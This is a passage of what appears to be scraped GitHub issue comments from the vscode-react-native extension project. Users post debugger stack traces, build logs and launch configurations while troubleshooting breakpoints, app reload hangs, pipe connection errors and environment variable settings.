(/Users/andy/.vscode/extensions/ms-vscode.node-debug2-1.18.3/out/src/nodeDebugAdapter.js:400:15)\n    at Object.disconnect (/Users/andy/.vscode/extensions/ms-vscode.node-debug2-1.18.3/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:821:21)\n    at Object.dispatchRequest (/Users/andy/.vscode/extensions/vsmobile.vscode-react-native-0.4.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugSession.js:75:82)\n    at Object.disconnect (/Users/andy/.vscode/extensions/vsmobile.vscode-react-native-0.4.4/src/debugger/nodeDebugWrapper.js:83:23)\n    at Object.dispatchRequest (/Users/andy/.vscode/extensions/vsmobile.vscode-react-native-0.4.4/src/debugger/nodeDebugWrapper.js:44:29)\n    at Object.ProtocolServer._handleData (/Users/andy/.vscode/extensions/vsmobile.vscode-react-native-0.4.4/node_modules/vscode-debugadapter/lib/protocol.js:104:38)\n    at Socket.<anonymous> (/Users/andy/.vscode/extensions/vsmobile.vscode-react-native-0.4.4/node_modules/vscode-debugadapter/lib/protocol.js:24:60)\n    at emitOne (events.js:96:13)\n    at Socket.emit (events.js:191:7)\nI saw a similar issue referenced here: https://github.com/Microsoft/vscode-node-debug2/issues/149 ... Happy to open a separate issue if you think this is something real and not just a misconfiguration.. Hi @iTOYS , it seems like I'm getting closer, but not quite there yet.  I got rid of the error watching the file by explicitly installing watchman via homebrew, so that's better.  It seems to cleanly get to the QR code, and when I scan it in expo on my device, it starts debugging mode and outputs a line like this to the Debug Console:\nDebugger worker loaded runtime on port 11091 (the port changes on subsequent scans)\nHowever, I hit a redbox on the device as soon as it loads the js bundle:\n\nSo, still hitting a bit of a wall!\nNote that the redbox refers to port 8081, while the URL above the QR code mentions port 19000.  Not sure if that's relevant, but thought I'd point it out.  Any ideas?. ",
    "tiofabby": "Same issue here when trying to debug react native code: \n<<vscode-chrome-debug-core: 3.17.3\nCould not debug. Unknown error\nError processing \"disconnect\": TypeError: Cannot read property 'noDebug' of undefined\n\n\nThank you. \n\n",
    "jorgutdev": "This is also happening to me, is anyone working on this? I love this extension. ",
    "uri3000": "Is there a way to set a fixed port on the Exp app on Android? it changes automatically to 19001 if 19000 is temporarily unavailable (which can naturally happen) and then it's impossible to change it back to 19000.. ",
    "Gremlin80": "Umfortunately i ve got no usefull info on logs. \nHowever it is easy to reproduce the issue, after you generate the sample app with react native init, switch to app directory then run vs code. \nSelect debug configuration then run android, place a breakpoint and hit it. Then do continue.\nOn device activate the dev menu and choose reload\nApp does not restart\n. Is there a way to send you a small video?\n. OK: First Start. Application work ok. Logs:\nOutput of the Debug Console (View -> Toggle Debug Console):\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 32395\nRunning application \"TEST\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\n[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Starting React Native Packager.\n[Info] Attaching to running React Native packager\nScanning folders for symlinks in c:\\PROGETTI\\ReactNative\\TEST\\node_modules (27ms)\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug)...\nIncremental java compilation is an incubating feature.\n:app:preBuild UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:app:checkDebugManifest\n:app:preReleaseBuild UP-TO-DATE\n:app:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:app:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:app:prepareComFacebookFrescoDrawee130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFbcore130Library UP-TO-DATE\n:app:prepareComFacebookFrescoFresco130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipeline130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineBase130Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineOkhttp3130Library UP-TO-DATE\n:app:prepareComFacebookReactReactNative0493Library UP-TO-DATE\n:app:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:app:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:app:prepareDebugDependencies\n:app:compileDebugAidl UP-TO-DATE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:generateDebugResValues UP-TO-DATE\n:app:generateDebugResources UP-TO-DATE\n:app:mergeDebugResources UP-TO-DATE\n:app:bundleDebugJsAndAssets SKIPPED\n:app:processDebugManifest UP-TO-DATE\n:app:processDebugResources UP-TO-DATE\n:app:generateDebugSources UP-TO-DATE\n:app:incrementalDebugJavaCompilationSafeguard UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk UP-TO-DATE\n:app:compileDebugSources UP-TO-DATE\n:app:transformClassesWithDexForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:app:transformNative_libsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes UP-TO-DATE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug\n:app:packageDebug UP-TO-DATE\n:app:assembleDebug UP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Api_25(AVD) - 7.1.1' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 14.47 secs\nRunning C:\\AndroidSdk\\sdk/platform-tools/adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (C:\\AndroidSdk\\sdk/platform-tools/adb -s emulator-5554 shell am start -n com.test/com.test.MainActivity)...\nStarting: Intent { cmp=com.test/.MainActivity }\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nOS: win32 x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 32395\nRunning application \"TEST\" with appParams: {\"rootTag\":1}. DEV === true, development-level warning are ON, performance optimizations are OFF\nthen in my app.js i have this code:\nconstructor()\n  {\n    super();\n    var dummy = 1;\n    dummy++;\n  }\nthen i place a breakpoint in line \"var dummy = 1\".\ni switch to the emulator and i hit ctrl-m (on windows). the developer menu popup, the first top options ar e (please make sure you have the same):\n\"Reload\"\n\"Stop Remote Js Debugging\"\n\"Disable Live Reload\"\n\"Disable Hot Reloading\"\nthen i choose \"Reload\"\nthe app does reload, the breakpoint is reached and execution is paused . \nthen i choose \">\" on the debug menu (continue) then application hang with the main android activity fully blanked and non responsive.\nHere the logs after the \"Reload Command\"\nOutput of the Debug Console (View -> Toggle Debug Console):\nDebugger worker loaded runtime on port 39732\nRunning application \"TEST\" with appParams: {\"rootTag\":11}. DEV === true, development-level warning are ON, performance optimizations are OFF\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\PROGETTI\\ReactNative\\TEST\"\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nDebugger worker loaded runtime on port 39732\nRunning application \"TEST\" with appParams: {\"rootTag\":11}. DEV === true, development-level warning are ON, performance optimizations are OFF\n. Unfortunately it does hang too even with chrome. I've found a lot of reports with similar issues in react native project, but they seems to ignore the issue. I've found it's a old bug.\n. Are you able to reproduce the issue?it's not deterministic. something i've been able to do \"reload\" two or three times before getting the hang up  . the trick to reproduce this is relatively simple: take the breakpoint active on a code part that is executed during app reload.\nEvery time the breakpoint stops, hit 'continue' then force a reload. \nthe breakpoint will break again, hit 'continue' then force a reload.\n.......\nrepeat 5 or more times, should hang. breakpoints does not work at all.\nthe only way to break is to type \"debugger\" where one need to set the breakpoint.\nthis way the debugger is invoked and execution stops. same issue encoutered. the extesions allow for a \" debug once \" feature. ..... \nuninstalling the extension does not work, however, completely clear the .vscode/extensions folder allow for another debug session....  . is there a way to downgrade to pre 0.6.x version of react-native-tools?. @scolestock . i'm pretty sure that if you replace a breakpoint on (say: line 11) with the corresponding debugger;instruction, the execution stops. \nmaybe somewhat related to sourcemaps ? . @domialex removing/installing the extension solves partially the issue, next time you use the extension after the first successful use, you will need do remove / reintstall.\nunfortunately i'm not able to reach the pc (for three years) where i've experiencied the issue. i will retry with the last version soon and let you know about.. Additional Info:\nthe issue that is reporting the \"hang up\" problem after the first successful use is most probably related to windows version. Checking more in depth on the output console there is a message like this:\nError: connect ENOENT /tmp/vscode-reactnative-.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '/tmp/vscode-reactnative-.sock' }\nthis is a failing attempt to connect (via pipe) from the extension.\nSince removing the .vscode directory and reinstalling from scratch solve temporarily the problem allowing another successful run i suspect there is something that is persisted and not cleared or updated across multiple uses.. @domialex it is not strictly related to adb.exe still running:\nhere the detailed error code:\n{ Error: connect ENOENT //?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '//?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355' }{ Error: connect ENOENT //?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '//?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355' }\nHere after A COMPLETE REBOOT of the Machine.\n{ Error: connect ENOENT //?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '//?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355' }{ Error: connect ENOENT //?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '//?/pipe/vscode-reactnative-931249d5ed1e20e06313cbaae2a75675cd321eaaeecfae597e135036de6a5355' }\nyes, the problem arise after you closed and reopened the vscode\nsomething persisted on disk. Hi, ruslan-bikkinin. Not sure but it is probably related the #625 .\nit is here from version 0.6.2, and  i faced it using expo but i also think it does appear with a standard react native app without expo.\nIt is easily reproducible, if you can't reproduce tell me please.\nI think it is probably related to source maps because a debugger instruction correctly stop the execution bringing up the vs code ide window.\n. who can say? actually with 0.6.5 we cannot reach the QR code screen. \nIt is incredible how any release can get worst and unusable compared to the previous.\nthis plugin is really crappyware. now we get\nSuccessfully ran adb reverse. Localhost urls should work on the connected Android device.Successfully ran adb reverse. Localhost urls should work on the connected Android device.Loading dependency graph, done.\n[Error] Error starting tunnel: Error: Starting tunnels timed out\n[Error] Error starting tunnel: Error: Starting tunnels timed out\n[Error] Error: Starting tunnels timed out\n. hi,\n there is a problem that may be related with source maps.\non chrome al breakpoint works.\nWhat i've verified are:\n- if you replace the breakpoint with a debugger; instruction it will stop\n- if you place the breakpoint in hand-written-by-you code (such in the event-handler of a button) this breakpoint work.\nfor example:\na) create  a event handler button click then attach to a buttton onpress event. Verify this is working as expected.\nb) place a breakpoint in the button handler then click the button. Should stop.. ",
    "jwargo": "Can you elaborate a little here? What do you want to be able to do? How do you want to be able to do it? It feels like some details are missing here. . I don't know. @iTOYS can you please take a look?. it was another plugin in my vs Code implementation that caused the problem.. @arolson101 we do not support the Windows platform today, but the team's listed this as an enhancement request and will investigate adding support in the future.. Are you following the Debugging Expo applications instructions? You should, I think, be executing Debug in Exponent to debug the app. I'm not sure if what I did here was correct. I was having trouble determining when it's react-native vs. React Native. . I would change this to: \"You can add VSCode tasks to build an .apk file and generate iOS/Android bundles\" . ",
    "timscott": "We are using react-native-config to set environment specific variables. Among other things, we are using it to set the host for api calls in dev. Localhost is addressed differently with different simulator/emulators. In android emulator it's 10.0.2.2. In GenyMotion it's 10.0.3.2. In the iOS simulator, it's localhost.\nreact-native-config uses ENVFILE environment variable to pick up the correct .env file. To illustrate, here are some of the scripts we use:\njson\n\"scripts\": {\n  \"ios\": \"ENVFILE=etc/dev.ios.env react-native run-ios\",\n  \"android\": \"ENVFILE=etc/dev.android.env react-native run-android\",\n  \"geny\": \"ENVFILE=etc/dev.genymotion.env react-native run-android\"\n}\nThere are probably other ways we can handle this using the variant switch, but I would expect that a debug runner might allow customizing the execute command for more flexibility.\n. ",
    "waltermvp": "@timscott  @jwargo in in the same boat here, need to specify an environment variable for react native config ive tried adding the following to my debug ios configuaration with luck no success\n\"env\": {\n                \"ENVFILE\": \".env.dev\"\n            },. @jwargo any ideas?. Also when i hover over \"env\" i get `Property env is not allowed' even though documentation says its allowed.. @itoys would this require an enhancement to do? Or should this just work?. Got it thanks, if I can help let me know :)\n@itoys. @iTOYS  Am I using this correctly?\njson\n        {\n            \"name\": \"Debug iOS Demo\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n            \"env\": {\n                \"ENVFILE\": \".env.demo\"\n            }\n        },. @iTOYS not working either way for me (providing variables from launch.json directly or providing a file name for a env file) can you provide an example of the contents of .env.demo. I want to make sure im using the correct format.. @itoys awesome. \ud83c\udf89\ud83c\udf89\ud83c\udf89 thanks a lot for this . ",
    "jing2si": "The below 'Vim' plugin's setting will dynamically change settings cause this issue.\njs\n  \"vim.statusBarColorControl\": true,\n  \"vim.statusBarColors\": {\n    \"normal\": \"#005f5f\",\n    \"insert\": \"#5f0000\",\n    \"visual\": \"#5f00af\",\n    \"visualline\": \"#005f87\",\n    \"visualblock\": \"#86592d\",\n    \"replace\": \"#000000\"\n  }\n. ",
    "matheusrocha89": "@jing2si Thanks, I will to remove it and see if it works.. @jing2si It worked fine. Thanks for the tip.. ",
    "kortina": "shit, i just realized i am in the wrong repo. ",
    "uriva": "I've managed to get it to work in a hybrid manner, I first run react-native start outside, then give commands using vs-code. It's not perfect but it works.. ",
    "redlock": "I'm still having this issue in version 0.5.7. It is a react-native init project. \nThe output of the React-Native output channel:\n\n. When I downgraded react-native to version 0.49.5 the problem disappeared. \nAdvised by the following thread: \nhttps://github.com/Microsoft/vscode/issues/37734\nHowever I need to use the latest react-native for my project so this isn't a viable solution.. ",
    "rardoz": "Output of the \"React Native: Run Ios\" output channel (View -> Toggle Output -> Select \"React Native: Run Ios\" in ListBox).\n```\n[Info] Starting React Native Packager.\n[Debug] Executing command: react-native run-ios --simulator iPhone 5s --no-packager\nScanning folders for symlinks in /Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules (7ms)\nFound Xcode project Spellcaster.xcodeproj\nCoreData: annotation:  Failed to load optimized model at path '/Applications/Xcode.app/Contents/Applications/Instruments.app/Contents/Frameworks/InstrumentsPackaging.framework/Versions/A/Resources/XRPackageModel.momd/XRPackageModel 9.0.omo'\nLaunching iPhone 5s (iOS 11.1)...\nBuilding using \"xcodebuild -project Spellcaster.xcodeproj -configuration Debug -scheme Spellcaster -destination id=B94BC63B-1FEC-4F42-8DF9-87E9AD5FDF2B -derivedDataPath build\"\n2017-11-08 07:13:22.566 xcodebuild[2109:144188] warning:  The file reference for \"libReact-tvOS.a\" is a member of multiple groups (\"Products\" and \"Products\"); this indicates a malformed project.  Only the membership in one of the groups will be preserved (but membership in targets will be unaffected).  If you want a reference to the same file in more than one group, please add another reference to the same path.\n\nBuilding React/yoga [Debug]\nCheck Dependencies\nBuilding React/privatedata [Debug]\nCheck Dependencies\nBuilding React/double-conversion [Debug]\nCheck Dependencies\nRunning script 'Install Third Party'\nBuilding React/third-party [Debug]\nCheck Dependencies\nBuilding React/jschelpers [Debug]\nCheck Dependencies\nBuilding React/cxxreact [Debug]\nCheck Dependencies\nBuilding React/React [Debug]\nCheck Dependencies\nRunning script 'Start Packager'\nRunning script 'Include RCTJSCProfiler'\nBuilding RCTText/RCTText [Debug]\nCheck Dependencies\nBuilding RCTBlob/RCTBlob [Debug]\nCheck Dependencies\nBuilding RCTActionSheet/RCTActionSheet [Debug]\nCheck Dependencies\nBuilding RCTWebSocket/fishhook [Debug]\nCheck Dependencies\nBuilding RCTWebSocket/RCTWebSocket [Debug]\nCheck Dependencies\nBuilding RNVectorIcons/RNVectorIcons [Debug]\nCheck Dependencies\nBuilding RCTNetwork/RCTNetwork [Debug]\nCheck Dependencies\nBuilding RCTVibration/RCTVibration [Debug]\nCheck Dependencies\nBuilding RCTImage/RCTImage [Debug]\nCheck Dependencies\nBuilding RCTSettings/RCTSettings [Debug]\nCheck Dependencies\nBuilding RCTAnimation/RCTAnimation [Debug]\nCheck Dependencies\nBuilding RCTLinking/RCTLinking [Debug]\nCheck Dependencies\nBuilding RCTGeolocation/RCTGeolocation [Debug]\nCheck Dependencies\nBuilding Spellcaster/Spellcaster [Debug]\nCheck Dependencies\nProcessing Info.plist\nRunning script 'Bundle React Native code and images'\nTouching Spellcaster.app\nSigning build/Build/Products/Debug-iphonesimulator/Spellcaster.app\nBuilding Spellcaster/SpellcasterTests [Debug]\nCheck Dependencies\nProcessing Info.plist\nLinking SpellcasterTests\nTouching SpellcasterTests.xctest\nSigning build/Build/Products/Debug-iphonesimulator/Spellcaster.app/PlugIns/SpellcasterTests.xctest\nBuild Succeeded\nInstalling build/Build/Products/Debug-iphonesimulator/Spellcaster.app\nLaunching org.reactjs.native.example.Spellcaster\norg.reactjs.native.example.Spellcaster: 2188\n[Debug] Finished executing: react-native run-ios --simulator iPhone 5s --no-packager\nOutput of the Debug Console (View -> Toggle Debug Console)\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.4\nFrom client: initialize({\"clientID\":\"vscode\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en-us\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":true}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true}}\nCould not debug. Unknown error\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"terminated\"}\nFrom client: disconnect({\"restart\":false})\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n[Debug] Extension messaging server started at /tmp/vscode-reactnative-31e804f41d7dfdc1a7569ee9dca1c8804b6ed3b9fd0d4ba95da3ca6dea0710d7.sock.\n\n[Info] Starting Packager\n[Debug] Executing command: react-native start --port 8081\nScanning folders for symlinks in /Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules (6ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running Metro Bundler on port 8081.                                       \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep Metro Bundler running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own Metro Bundler  instance if you    \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   /Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2 \nMetro Bundler ready.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] Entry point at /Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/index.ios.js doesn'tLog. exist. Skipping prewarming...\n[Info] Building and running application.\nLoading dependency graph, done.\n[Error] Error: Unknown error\nStarting custom debugger by executing: echo A debugger is not needed:  \"/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2\"\nBundling index.js  [development, non-minified]  100.0% (2585/2585), done.\n. \n{\n      \"name\": \"Debug iOS\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"ios\",\n      \"target\": \"iPhone 5s\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n      \"trace\": \"verbose\"\n},\n. [Spellcaster.zip](https://github.com/Microsoft/vscode-react-native/files/1472890/Spellcaster.zip)\n. Still not working. I wonder if it is a homebrew package thats messing things up. How do I get more info on the unkown error? There are no details..\nDebugging with inspector protocol because Node.js v8.9.0 was detected.\nnode --inspect-brk=4796 --harmony src/debugger/reactNativeDebugEntryPoint.js --server=4712 \nDebugger listening on ws://127.0.0.1:4796/f3db2859-b660-4cec-a9c1-08f1dd397da5\nDebugger attached.\nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \nError processing \"setBreakpoints\": Could not resolve breakpoint\nwaiting for debug protocol on port 4712\n/Applications/Visual Studio Code - Insiders.app/Contents/MacOS/Electron --debugBrkPluginHost=19574 --debugId=6943ca20-3455-48f3-9f43-eeda291f26ba --extensionDevelopmentPath=/Users/rardoz/Documents/ZARDOZ/forks/vscode-react-native \nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \nError processing \"setBreakpoints\": TypeError: Cannot read property 'mappedPath' of undefined\n    at EagerSourceMapTransformer.setBreakpoints (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/transformers/baseSourceMapTransformer.js:63:23)\n    at validateBreakpointsPath.then (/Users/rardoz/.vscode-insiders/extensions/ms-vscode.node-debug2-1.18.4/node_modules/vscode-chrome-debug-core/out/src/chrome/chromeDebugAdapter.js:827:40)\n    at \n[EditorConfig.EditorConfig] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'editor.detectIndentation', provide the URI of a resource or 'null' for any resource.\nLooking for parseable documents...\n[chenxsan.vscode-standardjs] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'standard.semistandard', provide the URI of a resource or 'null' for any resource.\n[chenxsan.vscode-standardjs] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'standard.semistandard', provide the URI of a resource or 'null' for any resource.\nvscode-icons is active!\nCongratulations, your extension \"webpack-progress\" is now active!\n[2017-11-17T08:07:45.684Z] [INFO] nuclide - Path to Flow: flow\n[chenxsan.vscode-standardjs] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'standard._legacyModuleResolve', provide the URI of a resource or 'null' for any resource.\n[chenxsan.vscode-standardjs] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'standard.nodePath', provide the URI of a resource or 'null' for any resource.\n[dbaeumer.vscode-eslint] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'eslint._legacyModuleResolve', provide the URI of a resource or 'null' for any resource.\n[dbaeumer.vscode-eslint] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'eslint.nodePath', provide the URI of a resource or 'null' for any resource.\nFound all parseable documents.\nParsing documents and looking for CSS class definitions...\n[chenxsan.vscode-standardjs] Accessing a window scoped configuration for a resource is not expected. To associate 'standard.usePackageJson' to a resource, define its scope to 'resource' in configuration contributions in 'package.json'.\nSummary:\n57 parseable documents found\n620 CSS class definitions found\n190 unique CSS class definitions found\n5 failed attempts to parse. List of the documents:\n```\nThis part is interesting. There was a point when the debugger was writing out files to the .react folder. The odd thing was there was some raw html floating right before the final call in debuggerWorker.js:\n<!doctype><html>...</html>\n// Notify debugger that we're done with loading\n// and started listening for IPC messages\npostMessage({workerLoaded:true});\nI believe this was happening on the previous version. I since updated and now the file does not generate. The error was the syntax. I think this might be related to the failed attempts to parse error.\n```\n5 failed attempts to parse. List of the documents:\n/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules/errorhandler/public/error.html: {\"reason\":\"selector missing\",\"line\":1,\"column\":1,\"source\":\"{style}\"}\n/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules/serve-index/public/directory.html: {\"reason\":\"selector missing\",\"line\":1,\"column\":1,\"source\":\"{style}\"}\n/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules/convert-source-map/test/fixtures/map-file-comment-double-slash.css: {\"reason\":\"missing 